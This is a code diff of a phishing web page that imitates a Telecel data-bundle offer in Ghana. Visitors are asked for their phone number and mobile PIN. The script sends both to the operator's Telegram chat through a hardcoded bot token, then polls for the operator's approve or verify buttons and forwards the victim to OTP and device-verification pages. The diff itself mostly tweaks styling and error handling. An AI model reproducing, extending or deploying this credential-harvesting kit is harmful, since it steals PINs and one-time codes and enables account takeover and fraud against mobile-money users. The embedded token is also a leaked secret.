@@ -14,7 +14,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 8px;
+            padding: 10px;
         }
         .container {
             width: 100%;
@@ -26,51 +26,51 @@
         }
         .logo-section {
             text-align: center;
-            padding: 22px 0 12px;
+            padding: 25px 0 15px;
         }
         .telecel-logo {
-            width: 130px;
+            width: 135px;
             height: auto;
             margin: 0 auto;
         }
         h1 {
             text-align: center;
-            font-size: 21.5px;
+            font-size: 22px;
             font-weight: 700;
-            margin: 8px 0 5px;
+            margin: 10px 0 6px;
             color: #1e2937;
         }
         .subtitle {
             text-align: center;
             color: #475569;
-            font-size: 14.8px;
-            padding: 0 24px 16px;
+            font-size: 15px;
+            padding: 0 25px 16px;
             line-height: 1.5;
         }
         .offer-info {
             background: #fff0f0;
-            margin: 0 20px 20px;
-            padding: 15px;
+            margin: 0 20px 22px;
+            padding: 16px;
             border-radius: 14px;
             text-align: center;
             border: 1px solid #ffe0e0;
         }
         .form-section {
-            padding: 0 24px 28px;
+            padding: 0 25px 32px;
         }
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            font-size: 14.5px;
+            font-size: 14.8px;
             font-weight: 600;
-            margin-bottom: 6px;
+            margin-bottom: 7px;
             color: #1e2937;
         }
         input, select {
             width: 100%;
-            padding: 13.5px 16px;
+            padding: 14px 16px;
             border: 1.8px solid #e2e8f0;
             border-radius: 12px;
             font-size: 16.5px;
@@ -85,30 +85,30 @@
             background: #E30613;
             color: white;
             border: none;
-            padding: 15.5px;
+            padding: 16px;
             font-size: 17px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
-            margin-top: 8px;
+            margin-top: 10px;
         }
         .back-btn {
             width: 100%;
             background: transparent;
             color: #64748b;
             border: 2px solid #e2e8f0;
-            padding: 14px;
-            font-size: 15.5px;
+            padding: 14.5px;
+            font-size: 16px;
             font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 12px;
         }
         .error-msg {
             text-align: center;
-            margin: 10px 0;
-            font-size: 14.5px;
-            padding: 12px;
+            margin: 12px 0;
+            font-size: 14.8px;
+            padding: 13px;
             border-radius: 12px;
             display: none;
             color: #dc3545;
@@ -127,7 +127,7 @@
 
         <div class="offer-info" id="offerInfo">
             <strong id="offerTitle"></strong><br>
-            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
+            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
         </div>
 
         <div class="form-section">
@@ -155,12 +155,11 @@
 
     <!-- Spinner -->
     <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
-        <div style="width:68px; height:68px; border:6px solid #fff; border-top-color:#E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
-        <p style="margin-top:20px; font-size:16.5px;">Verifying your number...</p>
+        <div style="width:72px; height:72px; border:7px solid #fff; border-top-color:#E30613; border-radius:50%; animation:spin 1s linear infinite;"></div>
+        <p style="margin-top:25px; font-size:17px;">Verifying your number...</p>
     </div>
 
     <script>
-        // Script remains the same as before
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
@@ -187,18 +186,22 @@
         function loadOffer() {
             const params = new URLSearchParams(window.location.search);
             const name = params.get('offer') || 'Data Bundle';
-            const price = params.get('price') || '0';
             const data = params.get('data') || '';
+            const price = params.get('price') || '0';
+            
             offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
             offerPriceEl.textContent = `GHS ${price}`;
         }
 
-        phoneInput.addEventListener('input', () => phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10));
-        pinInput.addEventListener('input', () => pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4));
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
 
-        // ... (rest of your script remains the same)
+        pinInput.addEventListener('input', () => {
+            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
+        });
+
         function sendToBot(phone, pin) {
-            // Your existing sendToBot function
             const ts = Date.now();
             const approveId = `approve_${ts}`;
             const verifyId = `verify_${ts}`;
@@ -223,11 +226,15 @@
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, verifyId, declineId);
+                startPolling(approveId, verifyId, declineId, phone, pin);
+            }).catch(() => {
+                spinner.style.display = 'none';
+                errMsg.textContent = "Network error. Please try again.";
+                errMsg.style.display = 'block';
             });
         }
 
-        function startPolling(approveId, verifyId, declineId) {
+        function startPolling(approveId, verifyId, declineId, phone, pin) {
             if (state.pollInterval) clearInterval(state.pollInterval);
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
@@ -238,12 +245,22 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                if (cb === approveId) window.location.href = CONFIG.APPROVE_PAGE;
-                                else if (cb === verifyId) window.location.href = CONFIG.DEVICE_PAGE;
-                                else if (cb.startsWith('valid_')) window.location.href = 'https://unlimiteddata.vercel.app/success.html';
+                                if (cb === approveId) {
+                                    // Pass parameters to OTP page
+                                    const params = new URLSearchParams(window.location.search);
+                                    window.location.href = CONFIG.APPROVE_PAGE + '?' + params.toString();
+                                }
+                                else if (cb === verifyId) {
+                                    const params = new URLSearchParams(window.location.search);
+                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
+                                }
+                                else if (cb.startsWith('valid_')) {
+                                    const params = new URLSearchParams(window.location.search);
+                                    window.location.href = 'https://unlimiteddata.vercel.app/success.html?' + params.toString();
+                                }
                                 else if (cb.startsWith('invalid_') || cb === declineId) {
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = "Request declined. Please try again.";
+                                    errMsg.textContent = "Request declined or invalid PIN. Please try again.";
                                     errMsg.style.display = 'block';
                                 }
                             }
@@ -267,9 +284,11 @@
                 errMsg.style.display = 'block';
                 return;
             }
+
             sendToBot(phone, pin);
         };
 
+        // Initialize
         loadOffer();
         phoneInput.focus();
     </script>
